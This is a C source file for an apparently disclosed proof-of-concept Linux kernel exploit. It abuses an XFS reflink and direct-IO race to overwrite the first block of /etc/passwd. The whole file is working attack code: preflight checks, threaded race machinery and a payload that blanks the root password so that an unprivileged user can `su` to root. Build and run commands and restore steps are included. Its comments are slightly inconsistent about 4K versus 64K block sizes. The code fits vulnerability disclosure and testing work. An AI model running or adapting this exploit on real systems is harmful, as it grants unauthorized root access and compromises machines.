/* refluxfs.c -- RefluXFS PoC (CVE-2026-XXXXX)
 *
 * This PoC targets /etc/passwd (always world-readable, arch-independent, easy
 * to verify and revert).  It never opens the target for write; the corrupting
 * DIO is issued against the attacker-owned CLONE, whose stale imap points at
 * the target's block.  Before racing, it saves a full BYTE-COPY backup of the
 * target (read/write -- never reflink, so it takes no refcount on the block).
 * On success it leaves /etc/passwd modified so you can `su` (empty password),
 * confirm uid=0, and restore from the backup.
 *
 * Build:  cc -O2 -pthread -o refluxfs refluxfs.c
 * Run:    ./refluxfs                 # zero-arg defaults; safe to Ctrl-C
 *
 * Exit:   0  vulnerable (race fired; target left modified, backup saved)
 *         1  precondition unmet, or runtime error (with a specific reason)
 *         2  race did not fire (budget exhausted or interrupted)
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/vfs.h>
#include <linux/fs.h>
#include <linux/magic.h>
#include <linux/fiemap.h>
#include <stdatomic.h>

#ifndef FICLONE
#define FICLONE _IOW(0x94, 9, int)
#endif

/* original PoC assumed 4k fsblocks, but use 64k to cover more fs geometries */
#define BLK 65536

/* ---- configuration (overridable via CLI) --------------------------------- */
static const char *target_path   = "/etc/passwd";
static const char *clone_dir     = "/var/tmp";
static int         nr_writers    = 32;
static int         nr_pressure   = 8;
static int         budget_s      = 300;

/* ---- state --------------------------------------------------------------- */
static char  workdir[512], clone_path[600], backup_path[600];
static int   target_fd_ro = -1;
static unsigned char golden[BLK];        /* first block of target, verbatim   */
static ssize_t golden_len;               /* == min(i_size, BLK)               */
static unsigned char *dio_buf;           /* BLK-aligned; every writer pwrites */
static int   keep_backup;                /* set on success; gates atexit()    */
static atomic_int  sigint;               /* set by handler; read only by main */
static atomic_int  stop;                 /* set by main; read by threads      */
static long  rounds;
static pthread_barrier_t bar;

/* ---- helpers ------------------------------------------------------------- */
__attribute__((format(printf, 2, 3)))
static void say(const char *tag, const char *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    fprintf(stderr, "[%s] ", tag);
    vfprintf(stderr, fmt, ap);
    fprintf(stderr, "\n");
    va_end(ap);
}
#define OK(...)   say("+", __VA_ARGS__)
#define BAD(...)  say("!", __VA_ARGS__)
#define INFO(...) say("*", __VA_ARGS__)

static void die(int code, const char *why, const char *hint)
{
    BAD("%s: %s", why, strerror(errno));
    if (hint) INFO("%s", hint);
    exit(code);
}

static void on_signal(int sig)
{
    (void)sig;
    atomic_store(&sigint, 1);
}

/* Registered with atexit() as soon as workdir exists; runs on every exit
 * path (die(), preflight refusal, timeout, success).  Always removes clone
 * and pressure files; removes backup + workdir unless the run succeeded. */
static void cleanup(void)
{
    unlink(clone_path);
    for (int i = 0; i < nr_pressure; i++) {
        char p[600]; snprintf(p, sizeof p, "%s/press.%d", workdir, i); unlink(p);
    }
    if (!keep_backup) {
        unlink(backup_path);
        rmdir(workdir);
    }
}

/* ---- preflight ----------------------------------------------------------- */

static int same_fs(const char *a, const char *b)
{
    struct stat sa, sb;
    if (stat(a, &sa) || stat(b, &sb)) return -1;
    return sa.st_dev == sb.st_dev;
}

/* FIEMAP: is the target's first extent already shared (refcount > 1)?
 * If so the race can never see refcount==1. */
static int target_first_extent_shared(void)
{
    union {
        struct fiemap fm;
        char raw[sizeof(struct fiemap) + sizeof(struct fiemap_extent)];
    } q;
    memset(&q, 0, sizeof q);
    q.fm.fm_length = BLK;
    q.fm.fm_flags = FIEMAP_FLAG_SYNC;
    q.fm.fm_extent_count = 1;
    if (ioctl(target_fd_ro, FS_IOC_FIEMAP, &q) < 0) return -1; /* unknown */
    if (q.fm.fm_mapped_extents < 1) return -1;
    return (q.fm.fm_extents[0].fe_flags & FIEMAP_EXTENT_SHARED) ? 1 : 0;
}

static void preflight(void)
{
    struct stat st;

    /* 1. target readable */
    target_fd_ro = open(target_path, O_RDONLY);
    if (target_fd_ro < 0)
        die(1, "open target O_RDONLY",
            "Target must be world-readable. /etc/passwd is on every distro.");
    if (fstat(target_fd_ro, &st)) die(1, "fstat target", NULL);
    golden_len = pread(target_fd_ro, golden, BLK, 0);
    if (golden_len < 0) die(1, "read target", NULL);
    OK("target %s: readable, %lld bytes (using first %zd)",
       target_path, (long long)st.st_size, golden_len);
    if (st.st_blksize != BLK)
        INFO("note: st_blksize=%ld != %d -- this PoC assumes 4K fs blocks "
             "and may false-negative otherwise.", (long)st.st_blksize, BLK);

    /* We only assume line 1 is `root:x:...` -- universal on shadow-using Linux.
     * `root::...` means a previous run already emptied the password field. */
    if (golden_len >= 6 && !memcmp(golden, "root::", 6)) {
        BAD("target line 1 already has an empty password field (root::).");
        INFO("A previous run left it modified. Restore first (as root, or `su`):");
        INFO("    dd if=%s/.refluxfs-%d-PID/target.orig of=%s",
             clone_dir, (int)getuid(), target_path);
        INFO("(ls -d %s/.refluxfs-%d-*  to find the right PID directory;",
             clone_dir, (int)getuid());
        INFO(" use dd -- cp, and recent coreutils cat, may reflink.)");
        exit(1);
    }
    if (golden_len < 8 || memcmp(golden, "root:x:", 7) ||
        !memchr(golden, '\n', golden_len)) {
        BAD("target line 1 is not \"root:x:...\\n\" -- unexpected format.");
        INFO("This PoC's payload assumes the standard shadow-backed root entry.");
        INFO("Use -t to point at a different target or adjust the payload.");
        exit(1);
    }

    /* 3. clone_dir on the same superblock */
    if (access(clone_dir, W_OK)) die(1, "clone dir not writable",
        "Need a writable directory on the SAME XFS filesystem as the target.");
    int s = same_fs(target_path, clone_dir);
    if (s < 0) die(1, "stat clone dir", NULL);
    if (!s) {
        BAD("clone dir %s is NOT on the same filesystem as %s (st_dev differs).",
            clone_dir, target_path);
        INFO("FICLONE returns -EXDEV across superblocks. Use -d with a writable");
        INFO("directory on the target's mount (findmnt -T %s).", target_path);
        exit(1);
    }
    OK("clone dir %s: writable, same st_dev as target", clone_dir);

    /* 4. workdir */
    snprintf(workdir, sizeof workdir, "%s/.refluxfs-%d-%d",
             clone_dir, (int)getuid(), (int)getpid());
    if (mkdir(workdir, 0700) && errno != EEXIST)
        die(1, "mkdir workdir", NULL);
    snprintf(clone_path,  sizeof clone_path,  "%s/clone",       workdir);
    snprintf(backup_path, sizeof backup_path, "%s/target.orig", workdir);
    atexit(cleanup);           /* every exit() from here on cleans workdir */

    /* Full BYTE-COPY backup of target (read/write, never FICLONE/
     * copy_file_range -- must not take a refcount on the target's block). */
    {
        int bfd = open(backup_path, O_WRONLY|O_CREAT|O_TRUNC, 0600);
        if (bfd < 0) die(1, "open backup", NULL);
        unsigned char buf[8192]; ssize_t n; off_t off = 0;
        while ((n = pread(target_fd_ro, buf, sizeof buf, off)) > 0) {
            if (write(bfd, buf, n) != n) die(1, "write backup", NULL);
            off += n;
        }
        if (n < 0) die(1, "read target for backup", NULL);
        fsync(bfd); close(bfd);
        OK("workdir %s", workdir);
        OK("backup  %s  (%lld bytes, byte-copy -- no reflink taken)",
           backup_path, (long long)off);
    }

    /* 5. abort if target's first extent is already shared (checked BEFORE we
     *    FICLONE ourselves and create a share). */
    int sh = target_first_extent_shared();
    if (sh == 1) {
        BAD("target's first extent is ALREADY SHARED (FIEMAP_EXTENT_SHARED).");
        INFO("The race needs refcount(X) to drop to exactly 1; a pre-existing");
        INFO("reflink (e.g. `cp --reflink=auto` backup, coreutils >= 9.0 default)");
        INFO("keeps it >= 2 and the race can never fire. Reset primitive:");
        INFO("    chsh -s /usr/bin/bash");
        INFO("    (or `-s /bin/bash` if that says 'Shell not changed.'; on");
        INFO("     RHEL-family, chsh is in the optional util-linux-user pkg)");
        INFO("This rewrites /etc/passwd via rename(2) as a fresh unshared inode.");
        exit(1);
    } else if (sh == 0) {
        OK("target's first extent is not pre-shared (refcount==1)");
    } else {
        INFO("cannot determine sharing state via FIEMAP -- proceeding.");
    }

    /* 6. FICLONE actually works (=> reflink=1) */
    int c = open(clone_path, O_RDWR|O_CREAT|O_TRUNC, 0600);
    if (c < 0) die(1, "open clone", NULL);
    if (ioctl(c, FICLONE, target_fd_ro) < 0) {
        int e = errno;
        BAD("FICLONE(clone <- target) failed: %s", strerror(e));
        if (e == EOPNOTSUPP)
            INFO("This XFS was made with reflink=0 (xfsprogs < 5.1.0 or explicit).");
        else if (e == EXDEV)
            INFO("Different filesystem after all -- pick another -d directory.");
        close(c);
        exit(1);
    }
    close(c);
    OK("FICLONE works -- filesystem has reflink=1");

    /* 7. O_DIRECT open + one aligned pwrite actually work.  All writers share
     *    this one buffer -- payload never changes and pwrite() only reads it. */
    if ((errno = posix_memalign((void **)&dio_buf, BLK, BLK)))
        die(1, "posix_memalign", NULL);
    memset(dio_buf, 0, BLK);
    c = open(clone_path, O_RDWR|O_DIRECT);
    if (c < 0) die(1, "open clone O_DIRECT",
                "O_DIRECT is required to reach xfs_direct_write_iomap_begin().");
    if (pwrite(c, dio_buf, BLK, 0) != BLK)
        die(1, "O_DIRECT pwrite (alignment?)",
            "This PoC assumes 4K DIO alignment (default on all target distros).");
    close(c);
    OK("O_DIRECT open + %d-byte aligned pwrite work on clone", BLK);
}

/* ---- race machinery ------------------------------------------------------ */

static int reclone(void)
{
    int c = open(clone_path, O_RDWR|O_CREAT|O_TRUNC, 0600);
    if (c < 0) return -errno;
    int r = ioctl(c, FICLONE, target_fd_ro) < 0 ? -errno : 0;
    close(c);
    return r;
}

static int target_changed(void)
{
    unsigned char b[BLK] = {0};
    /* DIO landed on disk under a different address_space; drop the target's
     * (stale, clean) cached page so we re-read from disk. */
    posix_fadvise(target_fd_ro, 0, 0, POSIX_FADV_DONTNEED);
    ssize_t n = pread(target_fd_ro, b, golden_len, 0);
    return n == golden_len && memcmp(b, golden, golden_len) != 0;
}

static void *writer(void *arg)
{
    (void)arg;
    for (;;) {
        pthread_barrier_wait(&bar);          /* start of round */
        if (atomic_load(&stop)) break;       /* set only by main, only when
                                              * every writer is parked here */
        int fd = open(clone_path, O_RDWR|O_DIRECT);
        if (fd >= 0) { (void)!pwrite(fd, dio_buf, BLK, 0); close(fd); }
        pthread_barrier_wait(&bar);          /* end of round */
    }
    return NULL;
}

static void *pressure(void *arg)
{
    char p[600];
    snprintf(p, sizeof p, "%s/press.%d", workdir, (int)(intptr_t)arg);
    int fd = open(p, O_RDWR|O_CREAT|O_TRUNC, 0600);
    if (fd < 0) return NULL;
    char b = 0;
    while (!atomic_load(&stop)) {
        /* return values irrelevant -- goal is XFS log traffic, not the data */
        (void)!pwrite(fd, &b, 1, 0);
        (void)!ftruncate(fd, BLK);
        fdatasync(fd);
        (void)!ftruncate(fd, 0);
    }
    close(fd);
    return NULL;
}

/* ---- main ---------------------------------------------------------------- */

static void usage(const char *argv0)
{
    fprintf(stderr,
      "usage: %s [-t target] [-d clone-dir] [-s seconds] [-w writers] [-p pressure]\n"
      "  -t  target file            (default /etc/passwd; line 1 must be root:x:...)\n"
      "  -d  clone/work directory   (default /var/tmp; must be writable, same XFS as -t)\n"
      "  -s  budget in seconds      (default 300)\n"
      "  -w  concurrent DIO writers (default 32)\n"
      "  -p  log-pressure threads   (default 8)\n",
      argv0);
}

int main(int argc, char **argv)
{
    int opt;
    while ((opt = getopt(argc, argv, "t:d:s:w:p:h")) != -1) switch (opt) {
        case 't': target_path = optarg; break;
        case 'd': clone_dir   = optarg; break;
        case 's': budget_s    = atoi(optarg); if (budget_s    < 1) budget_s    = 1; break;
        case 'w': nr_writers  = atoi(optarg); if (nr_writers  < 2) nr_writers  = 2; break;
        case 'p': nr_pressure = atoi(optarg); if (nr_pressure < 0) nr_pressure = 0; break;
        default:  usage(argv[0]); return 1;
    }

    struct utsname un;
    uname(&un);
    INFO("RefluXFS PoC -- kernel %s", un.release);

    /* Install handlers BEFORE preflight so Ctrl-C after workdir/clone creation
     * still reaches atexit(cleanup) instead of leaving a reflinked clone (which
     * would keep the target's extent SHARED and defeat every later run). */
    signal(SIGINT,  on_signal);
    signal(SIGTERM, on_signal);

    preflight();

    /* Payload: surgical edit of line 1 only.  `root:x:...\n` -> `root::...\n\n`.
     * Shift the byte range [6, nl] one position left over the `x`; the
     * original `\n` at position nl is untouched, so we get two consecutive
     * newlines and every byte from line 2 onward stays at its ORIGINAL
     * offset -- correct for any file size, no entry straddles a boundary. */
    memcpy(dio_buf, golden, golden_len);
    ssize_t nl = 0;
    while (nl < golden_len && golden[nl] != '\n') nl++;
    memmove(dio_buf + 5, dio_buf + 6, (size_t)nl - 5);   /* nl>=7 by preflight */

    /* threads */
    if ((errno = pthread_barrier_init(&bar, NULL, nr_writers + 1)))
        die(1, "pthread_barrier_init", NULL);
    pthread_t *tw = calloc(nr_writers,  sizeof *tw);
    pthread_t *tp = calloc(nr_pressure ? nr_pressure : 1, sizeof *tp);
    if (!tw || !tp) { BAD("calloc: out of memory"); exit(1); }
    for (int i = 0; i < nr_writers;  i++)
        if ((errno = pthread_create(&tw[i], NULL, writer, NULL)))
            die(1, "pthread_create writer", NULL);
    for (int i = 0; i < nr_pressure; i++)
        if ((errno = pthread_create(&tp[i], NULL, pressure, (void*)(intptr_t)i)))
            die(1, "pthread_create pressure", NULL);

    /* Race: reclone -> release all writers -> check target -> repeat. */
    INFO("racing: %d writers + %d log-pressure threads, up to %ds ...",
         nr_writers, nr_pressure, budget_s);
    struct timespec t0, t; clock_gettime(CLOCK_MONOTONIC, &t0);
    int rc = 2, e;
    while (!atomic_load(&sigint)) {
        if ((e = reclone()) < 0) {
            fprintf(stderr, "\n");
            BAD("reclone: %s", strerror(-e));
            rc = 1; break;
        }
        rounds++;
        pthread_barrier_wait(&bar);          /* release writers */
        pthread_barrier_wait(&bar);          /* writers done   */
        if (target_changed()) { rc = 0; break; }
        clock_gettime(CLOCK_MONOTONIC, &t);
        long el = t.tv_sec - t0.tv_sec;
        if (el >= budget_s) break;
        if ((rounds & 0xff) == 0)
            fprintf(stderr, "\r    round %ld  (%lds, ~%ld r/s)   ",
                    rounds, el, el ? rounds/el : rounds);
    }
    fprintf(stderr, "\n");

    /* Shutdown. Every path out of the loop above leaves each writer either
     * already at (or on its way to) the start-barrier -- the loop never breaks
     * between the two barrier_wait()s, and writers only test `stop`, which is
     * still 0.  Set `stop` now, cross the start-barrier once to release them;
     * they observe `stop` immediately after and exit without a second wait. */
    atomic_store(&stop, 1);
    pthread_barrier_wait(&bar);
    for (int i = 0; i < nr_writers;  i++) pthread_join(tw[i], NULL);
    for (int i = 0; i < nr_pressure; i++) pthread_join(tp[i], NULL);
    free(tw); free(tp);

    if (rc == 0) {
        keep_backup = 1;       /* atexit(cleanup) leaves backup + workdir */
        char now[96] = {0};
        if (pread(target_fd_ro, now, sizeof now - 1, 0) > 0)
            for (char *q = now; *q; q++) if (*q == '\n') { *q = 0; break; }
        BAD("=========================================================");
        BAD("VULNERABLE -- %s block 0 overwritten via stale-imap DIO", target_path);
        BAD("first line is now:  %s", now);
        BAD("hit at round %ld", rounds);
        BAD("=========================================================");
        fprintf(stderr, "\n");
        INFO("Confirm:  su                 (empty password -> `id` shows uid=0)");
        INFO("Restore:  # dd if=%s of=%s", backup_path, target_path);
        INFO("          (as root; dd is read/write. Do NOT use cp or cat: cp");
        INFO("           reflinks via FICLONE by default (>=9.0), and recent");
        INFO("           coreutils cat uses copy_file_range() which also");
        INFO("           reflinks -- either would leave the target SHARED.)");
    } else if (rc == 2) {
        OK("race did not fire in %ld rounds.", rounds);
        if (!atomic_load(&sigint))
            INFO("Kernel is likely PATCHED (or window too tight -- retry with larger -s / -w).");
    }
    return rc;
}
